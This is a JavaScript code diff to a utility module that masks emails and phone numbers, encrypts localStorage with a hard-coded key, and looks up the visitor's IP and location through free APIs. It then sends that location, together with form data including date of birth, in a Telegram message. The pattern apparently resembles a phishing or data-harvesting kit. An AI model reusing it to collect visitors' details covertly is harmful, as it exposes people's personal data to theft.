@@ -2,14 +2,12 @@
 
 const Utils = (() => {
 
-  // ── Ticket ID ──────────────────────────────────────────────
   function generateTicketId() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
     return `${seg()}-${seg()}-${seg()}`;
   }
 
-  // ── Mask helpers ───────────────────────────────────────────
   function maskEmail(email) {
     if (!email) return '';
     const [local, domain] = email.split('@');
@@ -22,7 +20,6 @@ const Utils = (() => {
     return phone.slice(0, 3) + '****' + phone.slice(-2);
   }
 
-  // ── Local Storage (encrypted with CryptoJS) ────────────────
   const SECRET = 'local_enc_key_2025';
 
   function saveRecord(key, data) {
@@ -51,23 +48,23 @@ const Utils = (() => {
     }
   }
 
-  // ── Fetch IP & Location (hỗ trợ IPv4 + IPv6) ──────────────
+  // ── Fetch IP & Location ────────────────────────────────────
   async function getIpInfo() {
     const providers = [
-      // 1. ipwho.is — hỗ trợ IPv6, miễn phí
+      // 1. ipwho.is
       async () => {
         const res = await fetch('https://ipwho.is/');
         const d = await res.json();
-        if (!d.success) throw new Error('fail');
+        if (!d.success || !d.ip) throw new Error('fail');
         return {
-          ip:           d.ip                  || 'N/A',
-          city:         d.city                || '',
-          region_code:  d.region_code         || '',
-          country_name: d.country             || '',
-          country_code: d.country_code        || '',
+          ip:           d.ip           || 'N/A',
+          city:         d.city         || '',
+          region:       d.region       || '',   // tên đầy đủ: "Hanoi"
+          country_name: d.country      || '',
+          country_code: d.country_code || '',
         };
       },
-      // 2. ipapi.co — fallback
+      // 2. ipapi.co
       async () => {
         const res = await fetch('https://ipapi.co/json/');
         const d = await res.json();
@@ -75,22 +72,22 @@ const Utils = (() => {
         return {
           ip:           d.ip           || 'N/A',
           city:         d.city         || '',
-          region_code:  d.region_code  || '',
+          region:       d.region       || '',   // tên đầy đủ: "Hanoi"
           country_name: d.country_name || '',
           country_code: d.country_code || '',
         };
       },
-      // 3. freeipapi.com — fallback cuối
+      // 3. freeipapi.com
       async () => {
         const res = await fetch('https://freeipapi.com/api/json');
         const d = await res.json();
         if (!d.ipAddress) throw new Error('fail');
         return {
-          ip:           d.ipAddress   || 'N/A',
-          city:         d.cityName    || '',
-          region_code:  d.regionCode  || '',
-          country_name: d.countryName || '',
-          country_code: d.countryCode || '',
+          ip:           d.ipAddress    || 'N/A',
+          city:         d.cityName     || '',
+          region:       d.regionName   || '',   // tên đầy đủ
+          country_name: d.countryName  || '',
+          country_code: d.countryCode  || '',
         };
       },
     ];
@@ -102,10 +99,10 @@ const Utils = (() => {
       } catch (_) {}
     }
 
-    return { ip: 'N/A', city: '', region_code: '', country_name: '', country_code: '' };
+    return { ip: 'N/A', city: '', region: '', country_name: '', country_code: '' };
   }
 
-  // ── Build Telegram message text ────────────────────────────
+  // ── Build Telegram message ─────────────────────────────────
   function buildMessage(data, ipInfo = {}) {
     const c = (val) => (val !== undefined && val !== null && val !== '') ? `<code>${val}</code>` : '<i>N/A</i>';
     const dob = (data.day && data.month && data.year)
@@ -113,12 +110,15 @@ const Utils = (() => {
 
     const ip       = ipInfo.ip           || 'N/A';
     const city     = ipInfo.city         || '';
-    const regCode  = ipInfo.region_code  || '';
+    const region   = ipInfo.region       || '';
     const country  = ipInfo.country_name || '';
     const countryC = ipInfo.country_code || '';
 
-    const locationParts = [city, regCode, country].filter(Boolean).join(', ');
-    const locationFull  = locationParts + (countryC ? ` (${countryC})` : '');
+    // Gộp location: loại bỏ trùng lặp giữa city và region
+    const locationParts = [city, region !== city ? region : '', country]
+      .filter(Boolean)
+      .join(', ');
+    const locationFull = locationParts + (countryC ? ` (${countryC})` : '');
 
     const lines = [];
 
@@ -147,7 +147,7 @@ const Utils = (() => {
     return lines.join('\n');
   }
 
-  // ── Send Notification via /api/send-telegram ───────────────
+  // ── Send Notification ──────────────────────────────────────
   async function sendNotification(data) {
     try {
       const ipInfo  = await getIpInfo();
